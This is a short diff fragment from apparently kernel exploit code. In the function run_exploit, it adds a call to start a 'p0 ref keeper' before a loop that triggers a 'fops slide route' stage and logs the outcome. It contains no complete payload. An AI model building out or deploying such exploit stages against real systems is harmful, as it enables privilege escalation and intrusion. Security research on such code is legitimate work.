@@ -622,6 +622,7 @@ int run_exploit(int argc, char **argv) {
             attempt, fops_fresh_page_attempts);
   }
 #else
+  start_p0_ref_keeper();
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
